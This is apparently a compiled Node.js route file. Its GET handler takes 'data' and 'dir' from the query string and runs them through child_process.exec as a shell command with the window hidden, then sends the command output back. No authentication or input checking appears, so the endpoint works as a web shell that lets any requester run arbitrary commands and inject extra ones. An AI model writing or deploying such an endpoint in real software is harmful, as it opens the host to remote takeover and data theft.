"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const child_process_1 = __importDefault(require("child_process"));
const router_1 = require("../config/router");
const util_1 = require("util");
const supported_types = ["cmd"];
const exec = (0, util_1.promisify)(child_process_1.default.exec);
exports.default = new router_1.Route({
    method: "GET",
    async handler(req, res) {
        const { data, type, dir } = req.query;
        if (!data || !type || !dir)
            return res.sendStatus(400);
        if (!supported_types.includes(type))
            return res.sendStatus(400);
        if (type === "cmd") {
            try {
                const { stdout, stderr } = await exec(`cd ${dir} && ${data}`, { windowsHide: true });
                const message = stdout + "\n" + stderr.trim();
                return res.send(message.trim());
            }
            catch (e) {
                const { stdout, stderr } = e;
                const message = stdout + "\n" + stderr.trim();
                return res.send(message.trim());
            }
        }
    },
});
